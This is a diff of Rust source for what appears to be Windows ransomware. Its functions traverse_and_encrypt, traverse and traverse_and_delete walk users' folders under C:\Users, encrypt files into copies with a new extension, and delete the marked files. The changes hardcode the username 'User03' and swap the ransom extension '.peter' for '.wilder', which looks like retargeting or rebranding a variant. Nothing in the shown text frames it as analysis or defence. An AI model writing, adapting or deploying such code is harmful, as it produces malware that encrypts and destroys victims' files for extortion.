@@ -67,7 +67,7 @@ pub fn traverse_and_encrypt() {
 
         for dir in dir_names.iter() {
             let mut full_path = String::from("C:\\Users\\");
-            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
+            full_path.push_str("User03");
             full_path.push_str("\\");
             full_path.push_str(dir.clone());
             full_path.push_str("\\*");
@@ -77,7 +77,7 @@ pub fn traverse_and_encrypt() {
         }
 
         let mut full_path = String::from("C:\\Users\\");
-        full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
+        full_path.push_str("User03");
         full_path.push_str("\\encrypt_date.txt");
 
         let full_path: CString = CString::new(full_path).unwrap();
@@ -184,7 +184,7 @@ fn traverse(dir_name: CString) {
                     for byte in source_file_name[..].iter() {
                         dest_file_name.push(byte.clone());
                     }
-                    for byte in ".peter".as_bytes().iter() {
+                    for byte in ".wilder".as_bytes().iter() {
                         dest_file_name.push(byte.clone());
                     }
                     encrypt(
@@ -246,7 +246,7 @@ pub fn traverse_and_delete() {
 
         for dir in dir_names.iter() {
             let mut full_path = String::from("C:\\Users\\");
-            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
+            full_path.push_str("User03");
             full_path.push_str("\\");
             full_path.push_str(dir.clone());
             full_path.push_str("\\*");
@@ -308,7 +308,7 @@ fn delete(dir_name: CString) {
                     extension.push(new_dir[i]);
                 }
 
-                if String::from_utf8(extension).unwrap() == ".peter".to_string() {
+                if String::from_utf8(extension).unwrap() == ".wilder".to_string() {
                     DeleteFileA(CString::new(new_dir).unwrap().as_ptr());
                 }
             } else {
